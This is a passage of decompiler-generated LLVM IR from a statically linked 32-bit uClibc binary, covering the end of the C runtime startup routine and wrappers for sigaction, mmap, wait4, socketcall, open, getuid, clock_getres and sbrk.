  store i32 %v10_804b33d, i32* @esi, align 4
  %v0_804b33e.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b33e

dec_label_pc_804b33e:                             ; preds = %dec_label_pc_804b330, %dec_label_pc_804b337
  %v0_804b33e = phi i32 [ %v0_804b33a, %dec_label_pc_804b330 ], [ %v0_804b33e.pre, %dec_label_pc_804b337 ]
  %v1_804b33e = add i32 %v0_804b33e, 8
  store i32 %v1_804b33e, i32* %ecx.global-to-local, align 4
  %v1_804b341 = inttoptr i32 %v1_804b33e to i32*
  %v2_804b341 = load i32, i32* %v1_804b341, align 4
  %v3_804b341 = icmp eq i32 %v2_804b341, 0
  %v1_804b344 = icmp eq i1 %v3_804b341, false
  br i1 %v1_804b344, label %dec_label_pc_804b330, label %dec_label_pc_804b341.dec_label_pc_804b346_crit_edge

dec_label_pc_804b341.dec_label_pc_804b346_crit_edge: ; preds = %dec_label_pc_804b33e
  br label %dec_label_pc_804b346

dec_label_pc_804b346:                             ; preds = %dec_label_pc_804b341.dec_label_pc_804b346_crit_edge, %dec_label_pc_804b328
  store i32 %v2_804b311, i32* @eax, align 4
  %v0_804b34a = call i32 @_dl_aux_init()
  store i32 %v0_804b34a, i32* @eax, align 4
  %v0_804b34f = call i32 @__GI___uClibc_init()
  %v1_804b358 = icmp eq i32 %tmp29, 0
  %v1_804b35a = icmp eq i1 %v1_804b358, false
  br i1 %v1_804b35a, label %dec_label_pc_804b360, label %dec_label_pc_804b35c

dec_label_pc_804b35c:                             ; preds = %dec_label_pc_804b346
  %v1_804b35c = and i32 %tmp29, -65536
  %v2_804b35c = or i32 %v1_804b35c, 4096
  br label %dec_label_pc_804b360

dec_label_pc_804b360:                             ; preds = %dec_label_pc_804b346, %dec_label_pc_804b35c
  %storemerge49 = phi i32 [ %v2_804b35c, %dec_label_pc_804b35c ], [ %tmp29, %dec_label_pc_804b346 ]
  %v0_804b360 = phi i32 [ %v2_804b35c, %dec_label_pc_804b35c ], [ %tmp29, %dec_label_pc_804b346 ]
  store i32 %storemerge49, i32* %eax.global-to-local, align 4
  store i32 %v0_804b360, i32* @global_var_80537b4.78, align 4
  %v13_804b365 = icmp eq i32 %tmp28, -1
  %v1_804b36a = icmp eq i1 %v13_804b365, false
  br i1 %v1_804b36a, label %dec_label_pc_804b395, label %dec_label_pc_804b36c

dec_label_pc_804b36c:                             ; preds = %dec_label_pc_804b360
  %v0_804b36c = call i32 @getuid()
  store i32 %v0_804b36c, i32* %eax.global-to-local, align 4
  store i32 %v0_804b36c, i32* @ebx, align 4
  %v0_804b373 = call i32 @geteuid()
  store i32 %v0_804b373, i32* %eax.global-to-local, align 4
  %v0_804b378 = load i32, i32* @ebx, align 4
  %v12_804b378 = icmp eq i32 %v0_804b378, %v0_804b373
  %v1_804b37a = icmp eq i1 %v12_804b378, false
  br i1 %v1_804b37a, label %dec_label_pc_804b3a5, label %dec_label_pc_804b37c

dec_label_pc_804b37c:                             ; preds = %dec_label_pc_804b36c
  %v0_804b37c = call i32 @getgid()
  store i32 %v0_804b37c, i32* %eax.global-to-local, align 4
  store i32 %v0_804b37c, i32* @ebx, align 4
  %v0_804b383 = call i32 @getegid()
  store i32 %v0_804b383, i32* %eax.global-to-local, align 4
  %v0_804b388 = load i32, i32* @ebx, align 4
  %v12_804b388 = icmp eq i32 %v0_804b388, %v0_804b383
  %v1_804b38a = icmp eq i1 %v12_804b388, false
  br i1 %v1_804b38a, label %dec_label_pc_804b3a5, label %dec_label_pc_804b38c.thread

dec_label_pc_804b38c.thread:                      ; preds = %dec_label_pc_804b37c
  store i32 %tmp28, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3cf

dec_label_pc_804b395:                             ; preds = %dec_label_pc_804b360
  store i32 %tmp28, i32* %eax.global-to-local, align 4
  %v15_804b395 = icmp eq i32 %tmp28, %tmp27
  %v1_804b399 = icmp eq i1 %v15_804b395, false
  br i1 %v1_804b399, label %dec_label_pc_804b3a5, label %dec_label_pc_804b39b

dec_label_pc_804b39b:                             ; preds = %dec_label_pc_804b395
  store i32 %tmp26, i32* %eax.global-to-local, align 4
  %v15_804b39f = icmp eq i32 %tmp26, %tmp25
  br i1 %v15_804b39f, label %dec_label_pc_804b3cf, label %dec_label_pc_804b3a5

dec_label_pc_804b3a5:                             ; preds = %dec_label_pc_804b39b, %dec_label_pc_804b395, %dec_label_pc_804b37c, %dec_label_pc_804b36c
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804b3ac = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804b3bb = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804b3ca = call i32 @__check_one_fd()
  store i32 %v0_804b3ca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3cf

dec_label_pc_804b3cf:                             ; preds = %dec_label_pc_804b38c.thread, %dec_label_pc_804b39b, %dec_label_pc_804b3a5
  %v0_804b3cf = load i32, i32* @ebp, align 4
  %v1_804b3cf = inttoptr i32 %v0_804b3cf to i32*
  %v2_804b3cf = load i32, i32* %v1_804b3cf, align 4
  store i32 %v2_804b3cf, i32* %eax.global-to-local, align 4
  store i32 %v2_804b3cf, i32* inttoptr (i32 134558776 to i32*), align 8
  %v0_804b3d7 = load i32, i32* @ebp, align 4
  %v1_804b3d7 = inttoptr i32 %v0_804b3d7 to i32*
  %v2_804b3d7 = load i32, i32* %v1_804b3d7, align 4
  store i32 %v2_804b3d7, i32* %ebx.global-to-local, align 4
  %v1_804b3da = icmp eq i32 %v2_804b3d7, 0
  br i1 %v1_804b3da, label %dec_label_pc_804b3cf.dec_label_pc_804b407_crit_edge, label %dec_label_pc_804b3de

dec_label_pc_804b3cf.dec_label_pc_804b407_crit_edge: ; preds = %dec_label_pc_804b3cf
  br label %dec_label_pc_804b407

dec_label_pc_804b3de:                             ; preds = %dec_label_pc_804b3cf
  store i32 %v2_804b3d7, i32* inttoptr (i32 134558784 to i32*), align 64
  store i32 47, i32* %stack_var_-144, align 4
  %v0_804b3e6 = load i32, i32* @ebp, align 4
  %v1_804b3e6 = inttoptr i32 %v0_804b3e6 to i32*
  %v2_804b3e6 = load i32, i32* %v1_804b3e6, align 4
  %v2_804b3e9 = inttoptr i32 %v2_804b3e6 to i8*
  %v3_804b3e9 = call i32 @strrchr(i8* %v2_804b3e9, i32 47)
  store i32 %v2_804b3e6, i32* %esi.global-to-local, align 4
  %v1_804b3f9 = add i32 %v3_804b3e9, 1
  store i32 %v1_804b3f9, i32* %eax.global-to-local, align 4
  store i32 %v1_804b3f9, i32* bitcast (i32** @global_var_805343c.85 to i32*), align 4
  br label %dec_label_pc_804b407

dec_label_pc_804b407:                             ; preds = %dec_label_pc_804b3cf.dec_label_pc_804b407_crit_edge, %dec_label_pc_804b3de
  store i32 %arg4, i32* %eax.global-to-local, align 4
  store i32 %arg4, i32* @global_var_80537b8.75, align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053300.73 to i32), i32 -134558464), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053300.73 to i32), i32 -134558464), i32 2), i32 0), label %dec_label_pc_804b425, label %dec_label_pc_804b460.critedge

dec_label_pc_804b425:                             ; preds = %dec_label_pc_804b407, %dec_label_pc_804b425
  %v4_804b42548 = phi i32 [ %v1_804b42c, %dec_label_pc_804b425 ], [ 0, %dec_label_pc_804b407 ]
  %v5_804b425 = mul i32 %v4_804b42548, 4
  %v6_804b425 = add i32 %v5_804b425, ptrtoint (i32* @global_var_8053300.73 to i32)
  %v7_804b425 = inttoptr i32 %v6_804b425 to i32*
  %v8_804b425 = load i32, i32* %v7_804b425, align 4
  call void @__pseudo_call(i32 %v8_804b425)
  %v0_804b42c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b42c = add i32 %v0_804b42c, 1
  %v1_804b42d.pre = load i32, i32* %esi.global-to-local, align 4
  store i32 %v1_804b42c, i32* %ebx.global-to-local, align 4
  %v7_804b42d = icmp ult i32 %v1_804b42c, %v1_804b42d.pre
  br i1 %v7_804b42d, label %dec_label_pc_804b425, label %dec_label_pc_804b431

dec_label_pc_804b431:                             ; preds = %dec_label_pc_804b425
  call void @__pseudo_call(i32 %arg2)
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053300.73 to i32), i32 -134558464), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053300.73 to i32), i32 -134558464), i32 2), i32 0), label %dec_label_pc_804b454, label %dec_label_pc_804b460

dec_label_pc_804b454:                             ; preds = %dec_label_pc_804b431, %dec_label_pc_804b454
  %v4_804b45447 = phi i32 [ %v1_804b45b, %dec_label_pc_804b454 ], [ 0, %dec_label_pc_804b431 ]
  store i32 ptrtoint (i32* @global_var_804b45b.87 to i32), i32* %stack_var_-144, align 4
  %v5_804b454 = mul i32 %v4_804b45447, 4
  %v6_804b454 = add i32 %v5_804b454, ptrtoint (i32* @global_var_8053300.73 to i32)
  %v7_804b454 = inttoptr i32 %v6_804b454 to i32*
  %v8_804b454 = load i32, i32* %v7_804b454, align 4
  call void @__pseudo_call(i32 %v8_804b454)
  %v0_804b45b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b45b = add i32 %v0_804b45b, 1
  %v1_804b45c.pre = load i32, i32* %esi.global-to-local, align 4
  store i32 %v1_804b45b, i32* %ebx.global-to-local, align 4
  %v7_804b45c = icmp ult i32 %v1_804b45b, %v1_804b45c.pre
  br i1 %v7_804b45c, label %dec_label_pc_804b454, label %dec_label_pc_804b460

dec_label_pc_804b460.critedge:                    ; preds = %dec_label_pc_804b407
  call void @__pseudo_call(i32 %arg2)
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053300.73 to i32), i32 -134558464), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b460

dec_label_pc_804b460:                             ; preds = %dec_label_pc_804b460.critedge, %dec_label_pc_804b454, %dec_label_pc_804b431
  store i32 134519548, i32* %eax.global-to-local, align 4
  %v0_804b469 = load i32, i32* %stack_var_-144, align 4
  %v1_804b469 = call i32 @__GI___errno_location(i32 %v0_804b469)
  %v1_804b46e = inttoptr i32 %v1_804b469 to i32*
  store i32 0, i32* %v1_804b46e, align 4
  store i32 134527412, i32* %eax.global-to-local, align 4
  %v0_804b47d = call i32 @__GI___h_errno_location()
  store i32 %v0_804b47d, i32* %eax.global-to-local, align 4
  %v1_804b482 = inttoptr i32 %v0_804b47d to i32*
  store i32 0, i32* %v1_804b482, align 4
  %v0_804b488 = load i32, i32* @global_var_80537b0.80, align 16
  store i32 %v0_804b488, i32* %stack_var_-144, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_804b49d = load i32, i32* %eax.global-to-local, align 4
  %v1_804b49e = call i32 @__GI_exit(i32 %v0_804b49d)
  store i32 173, i32* %eax.global-to-local, align 4
  %v0_804b4a9 = load i32, i32* @ebx, align 4
  %v1_804b4a9 = inttoptr i32 %v0_804b4a9 to %sigcontext*
  %v2_804b4a9 = call i32 @sigreturn(%sigcontext* %v1_804b4a9)
  store i32 119, i32* %eax.global-to-local, align 4
  %v0_804b4b1 = load i32, i32* @ebx, align 4
  %v1_804b4b1 = inttoptr i32 %v0_804b4b1 to %sigcontext*
  %v2_804b4b1 = call i32 @sigreturn(%sigcontext* %v1_804b4b1)
  store i32 %v2_804b4b1, i32* %eax.global-to-local, align 4
  ret i32 %v2_804b4b1

; uselistorder directives
  uselistorder i32 %v1_804b45b, { 2, 1, 0 }
  uselistorder i32 %v1_804b42c, { 2, 1, 0 }
  uselistorder i32 %v2_804b341, { 1, 0 }
  uselistorder i32 %v1_804b33e, { 1, 2, 0 }
  uselistorder i32 %v1_804b337, { 0, 2, 1 }
  uselistorder i32 %v1_804b323, { 0, 1, 2, 4, 3 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v2_804b2f0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i32 %tmp28, { 0, 2, 3, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 4, 3, 0, 6, 5, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 2, 5, 6, 8, 9, 7, 10, 11, 12, 13, 14, 15, 3, 4, 16, 17, 19, 18, 0, 23, 1, 20, 21, 22 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8053300.73 to i32), { 1, 2, 3, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053300.73 to i32), i32 -134558464), i32 2), { 0, 4, 1, 5, 3, 2 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 30, { 2, 9, 8, 3, 5, 1, 6, 7, 0, 4 }
  uselistorder i32* @global_var_80537b0.80, { 1, 0, 2, 3 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804b454, { 1, 0 }
  uselistorder label %dec_label_pc_804b425, { 1, 0 }
  uselistorder label %dec_label_pc_804b407, { 1, 0 }
  uselistorder label %dec_label_pc_804b3cf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b360, { 1, 0 }
  uselistorder label %dec_label_pc_804b33e, { 1, 0 }
  uselistorder label %dec_label_pc_804b330, { 1, 0 }
  uselistorder label %dec_label_pc_804b30a, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg2 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_804b4b4 = load i32, i32* @esi, align 4
  %v1_804b4be = icmp eq i32* %arg2, null
  br i1 %v1_804b4be, label %dec_label_pc_804b4ed, label %dec_label_pc_804b4c2

dec_label_pc_804b4c2:                             ; preds = %entry
  %v2_804b4c2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4c2, i32* %edi.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v2_804b4c8 = load i32, i32* %arg2, align 4
  store i32 %v2_804b4c8, i32* %stack_var_-28, align 4
  %v7_804b4c8 = load i1, i1* @df, align 1
  %v8_804b4c8 = select i1 %v7_804b4c8, i32 -4, i32 4
  %v9_804b4c8 = add i32 %v8_804b4c8, %v2_804b4c2
  %v10_804b4c8 = add i32 %v8_804b4c8, %tmp6
  store i32 %v9_804b4c8, i32* %edi.global-to-local, align 4
  store i32 %v10_804b4c8, i32* %esi.global-to-local, align 4
  %v1_804b4c9 = inttoptr i32 %v10_804b4c8 to i32*
  %v2_804b4c9 = load i32, i32* %v1_804b4c9, align 4
  %v4_804b4c9 = inttoptr i32 %v9_804b4c8 to i32*
  store i32 %v2_804b4c9, i32* %v4_804b4c9, align 4
  %v5_804b4c9 = load i32, i32* %edi.global-to-local, align 4
  %v6_804b4c9 = load i32, i32* %esi.global-to-local, align 4
  %v9_804b4c9 = add i32 %v5_804b4c9, %v8_804b4c8
  %v10_804b4c9 = add i32 %v6_804b4c9, %v8_804b4c8
  store i32 %v9_804b4c9, i32* %edi.global-to-local, align 4
  store i32 %v10_804b4c9, i32* %esi.global-to-local, align 4
  %v1_804b4ca = inttoptr i32 %v10_804b4c9 to i32*
  %v2_804b4ca = load i32, i32* %v1_804b4ca, align 4
  %v4_804b4ca = inttoptr i32 %v9_804b4c9 to i32*
  store i32 %v2_804b4ca, i32* %v4_804b4ca, align 4
  %v5_804b4ca = load i32, i32* %edi.global-to-local, align 4
  %v6_804b4ca = load i32, i32* %esi.global-to-local, align 4
  %v9_804b4ca = add i32 %v5_804b4ca, %v8_804b4c8
  %v10_804b4ca = add i32 %v6_804b4ca, %v8_804b4c8
  store i32 %v9_804b4ca, i32* %edi.global-to-local, align 4
  store i32 %v10_804b4ca, i32* %esi.global-to-local, align 4
  %v1_804b4cb = inttoptr i32 %v10_804b4ca to i32*
  %v2_804b4cb = load i32, i32* %v1_804b4cb, align 4
  %v4_804b4cb = inttoptr i32 %v9_804b4ca to i32*
  store i32 %v2_804b4cb, i32* %v4_804b4cb, align 4
  %v5_804b4cb = load i32, i32* %edi.global-to-local, align 4
  %v6_804b4cb = load i32, i32* %esi.global-to-local, align 4
  %v9_804b4cb = add i32 %v5_804b4cb, %v8_804b4c8
  %v10_804b4cb = add i32 %v6_804b4cb, %v8_804b4c8
  store i32 %v9_804b4cb, i32* %edi.global-to-local, align 4
  store i32 %v10_804b4cb, i32* %esi.global-to-local, align 4
  %v1_804b4cc = inttoptr i32 %v10_804b4cb to i32*
  %v2_804b4cc = load i32, i32* %v1_804b4cc, align 4
  %v4_804b4cc = inttoptr i32 %v9_804b4cb to i32*
  store i32 %v2_804b4cc, i32* %v4_804b4cc, align 4
  %v5_804b4cc = load i32, i32* %edi.global-to-local, align 4
  %v6_804b4cc = load i32, i32* %esi.global-to-local, align 4
  %v9_804b4cc = add i32 %v5_804b4cc, %v8_804b4c8
  %v10_804b4cc = add i32 %v6_804b4cc, %v8_804b4c8
  store i32 %v9_804b4cc, i32* %edi.global-to-local, align 4
  store i32 %v10_804b4cc, i32* @esi, align 4
  %v1_804b4da = add i32 %tmp6, 4
  %v2_804b4da = inttoptr i32 %v1_804b4da to i8*
  %v3_804b4da = load i8, i8* %v2_804b4da, align 1
  %v4_804b4da = and i8 %v3_804b4da, 4
  %v5_804b4da = icmp eq i8 %v4_804b4da, 0
  %v1_804b4de = icmp eq i1 %v5_804b4da, false
  br i1 %v1_804b4de, label %dec_label_pc_804b4e5, label %dec_label_pc_804b4e0

dec_label_pc_804b4e0:                             ; preds = %dec_label_pc_804b4c2
  br label %dec_label_pc_804b4e5

dec_label_pc_804b4e5:                             ; preds = %dec_label_pc_804b4c2, %dec_label_pc_804b4e0
  %phitmp = bitcast i32* %stack_var_-28 to %sigaction*
  br label %dec_label_pc_804b4ed

dec_label_pc_804b4ed:                             ; preds = %entry, %dec_label_pc_804b4e5
  %v0_804b4f3 = phi %sigaction* [ null, %entry ], [ %phitmp, %dec_label_pc_804b4e5 ]
  %v5_804b4f8 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_804b4f3, i32 %arg3, i32 8)
  store i32 %v0_804b4b4, i32* @esi, align 4
  ret i32 %v5_804b4f8

; uselistorder directives
  uselistorder i32 %tmp6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b4ed, { 1, 0 }
  uselistorder label %dec_label_pc_804b4e5, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_804b504 = load i32, i32* @ebx, align 4
  %v2_804b50b = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804b50b, i32* @ebx, align 4
  %v6_804b50f = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804b504, i32* @ebx, align 4
  %v3_804b518 = icmp ugt i32 %v6_804b50f, -4096
  call void @__pseudo_cond_branch(i1 %v3_804b518, i32 134532548)
  ret i32 %v6_804b50f

; uselistorder directives
  uselistorder i32 %v6_804b50f, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804b520 = load i32, i32* @esi, align 4
  store i32 %v0_804b520, i32* %stack_var_-4, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_804b531 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804b539 = call i32 @wait4(i32 %v0_804b531, i32 %v0_804b520, i32 %tmp5, i32 %arg1)
  store i32 %v0_804b531, i32* @ebx, align 4
  store i32 %v4_804b539, i32* %esi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_804b539, -4095
  br i1 %tmp8, label %dec_label_pc_804b552, label %dec_label_pc_804b546

dec_label_pc_804b546:                             ; preds = %entry
  %v1_804b546 = call i32 @__GI___errno_location(i32 %v0_804b531)
  %v0_804b54b = load i32, i32* %esi.global-to-local, align 4
  %v1_804b54b = sub i32 0, %v0_804b54b
  store i32 %v1_804b54b, i32* %esi.global-to-local, align 4
  %v2_804b54d = inttoptr i32 %v1_804b546 to i32*
  store i32 %v1_804b54b, i32* %v2_804b54d, align 4
  br label %dec_label_pc_804b552

dec_label_pc_804b552:                             ; preds = %entry, %dec_label_pc_804b546
  %v0_804b553 = phi i32 [ %v4_804b539, %entry ], [ -1, %dec_label_pc_804b546 ]
  %v2_804b552 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b552, i32* @esi, align 4
  ret i32 %v0_804b553

; uselistorder directives
  uselistorder i32 %v4_804b539, { 1, 0, 2 }
  uselistorder i32 %v0_804b531, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b552, { 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b554 = load i32, i32* @ebx, align 4
  store i32 %v0_804b554, i32* %stack_var_-4, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804b564 = call i32 @int80_syscall(i32 102)
  store i32 %v1_804b564, i32* %ebx.global-to-local, align 4
  %tmp5 = icmp ult i32 %v1_804b564, -4095
  br i1 %tmp5, label %dec_label_pc_804b57e, label %dec_label_pc_804b572

dec_label_pc_804b572:                             ; preds = %entry
  %v0_804b572 = load i32, i32* %stack_var_-4, align 4
  %v1_804b572 = call i32 @__GI___errno_location(i32 %v0_804b572)
  %v0_804b577 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b577 = sub i32 0, %v0_804b577
  store i32 %v1_804b577, i32* %ebx.global-to-local, align 4
  %v2_804b579 = inttoptr i32 %v1_804b572 to i32*
  store i32 %v1_804b577, i32* %v2_804b579, align 4
  br label %dec_label_pc_804b57e

dec_label_pc_804b57e:                             ; preds = %entry, %dec_label_pc_804b572
  %v0_804b57f = phi i32 [ %v1_804b564, %entry ], [ -1, %dec_label_pc_804b572 ]
  %v2_804b57e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b57e, i32* @ebx, align 4
  ret i32 %v0_804b57f

; uselistorder directives
  uselistorder i32 %v1_804b564, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b57e, { 1, 0 }
}

define i32 @__GI_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804b580 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804b584 = sdiv i32 %sext, 16777216
  store i32 %v4_804b584, i32* @ecx, align 4
  %v3_804b58a = and i32 %arg2, 64
  %v4_804b58a = icmp eq i32 %v3_804b58a, 0
  br i1 %v4_804b58a, label %dec_label_pc_804b59a, label %dec_label_pc_804b58f

dec_label_pc_804b58f:                             ; preds = %entry
  br label %dec_label_pc_804b59a

dec_label_pc_804b59a:                             ; preds = %entry, %dec_label_pc_804b58f
  %v4_804b59a = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b59a, i32* %ebx.global-to-local, align 4
  %v5_804b5a6 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804b584)
  store i32 %v5_804b5a6, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_804b5a6, -4095
  br i1 %tmp11, label %dec_label_pc_804b5bf, label %dec_label_pc_804b5b3

dec_label_pc_804b5b3:                             ; preds = %dec_label_pc_804b59a
  %v1_804b5b3 = call i32 @__GI___errno_location(i32 %v0_804b580)
  %v0_804b5b8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b5b8 = sub i32 0, %v0_804b5b8
  store i32 %v1_804b5b8, i32* %ebx.global-to-local, align 4
  %v2_804b5ba = inttoptr i32 %v1_804b5b3 to i32*
  store i32 %v1_804b5b8, i32* %v2_804b5ba, align 4
  br label %dec_label_pc_804b5bf

dec_label_pc_804b5bf:                             ; preds = %dec_label_pc_804b59a, %dec_label_pc_804b5b3
  %v0_804b5c1 = phi i32 [ %v5_804b5a6, %dec_label_pc_804b59a ], [ -1, %dec_label_pc_804b5b3 ]
  store i32 %v0_804b580, i32* @ebx, align 4
  ret i32 %v0_804b5c1

; uselistorder directives
  uselistorder i32 %v5_804b5a6, { 1, 0, 2 }
  uselistorder i32 %v4_804b584, { 1, 0 }
  uselistorder i32 %v0_804b580, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b5bf, { 1, 0 }
  uselistorder label %dec_label_pc_804b59a, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b5c4 = load i32, i32* @global_var_80537b4.78, align 4
  %v1_804b5ce = icmp eq i32 %v0_804b5c4, 0
  br i1 %v1_804b5ce, label %dec_label_pc_804b5d4, label %dec_label_pc_804b5d2

dec_label_pc_804b5d2:                             ; preds = %entry
  br label %dec_label_pc_804b5d4

dec_label_pc_804b5d4:                             ; preds = %entry, %dec_label_pc_804b5d2
  %v0_804b5d4 = phi i32 [ 4096, %entry ], [ %v0_804b5c4, %dec_label_pc_804b5d2 ]
  ret i32 %v0_804b5d4

; uselistorder directives
  uselistorder label %dec_label_pc_804b5d4, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_804b5dd = call i32 @int80_syscall(i32 199)
  ret i32 %v1_804b5dd
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b5e0 = load i32, i32* @ebx, align 4
  store i32 %v0_804b5e0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804b5f0 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804b5f0, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v4_804b5f0, -4095
  br i1 %tmp6, label %dec_label_pc_804b60a, label %dec_label_pc_804b5fe

dec_label_pc_804b5fe:                             ; preds = %entry
  %v0_804b5fe = load i32, i32* %stack_var_-4, align 4
  %v1_804b5fe = call i32 @__GI___errno_location(i32 %v0_804b5fe)
  %v0_804b603 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b603 = sub i32 0, %v0_804b603
  store i32 %v1_804b603, i32* %ebx.global-to-local, align 4
  %v2_804b605 = inttoptr i32 %v1_804b5fe to i32*
  store i32 %v1_804b603, i32* %v2_804b605, align 4
  br label %dec_label_pc_804b60a

dec_label_pc_804b60a:                             ; preds = %entry, %dec_label_pc_804b5fe
  %v0_804b60b = phi i32 [ %v4_804b5f0, %entry ], [ -1, %dec_label_pc_804b5fe ]
  %v2_804b60a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b60a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804b60b

; uselistorder directives
  uselistorder i32 %v4_804b5f0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b60a, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_804b611 = call i32 @int80_syscall(i32 202)
  ret i32 %v1_804b611
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_804b619 = call i32 @int80_syscall(i32 201)
  ret i32 %v1_804b619
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804b61d = load i32, i32* @ebx, align 4
  store i32 %v0_804b61d, i32* %stack_var_-8, align 4
  %v0_804b622 = load i32, i32* @global_var_80557d0.88, align 16
  %v1_804b622 = icmp eq i32 %v0_804b622, 0
  %v1_804b629 = icmp eq i1 %v1_804b622, false
  br i1 %v1_804b629, label %dec_label_pc_804b637, label %dec_label_pc_804b62b

dec_label_pc_804b62b:                             ; preds = %entry
  %v2_804b62d = call i32 @__GI_brk(i32* null)
  store i32 0, i32* @ecx, align 4
  %v2_804b633 = icmp slt i32 %v2_804b62d, 0
  br i1 %v2_804b633, label %dec_label_pc_804b654, label %dec_label_pc_804b62b.dec_label_pc_804b637_crit_edge

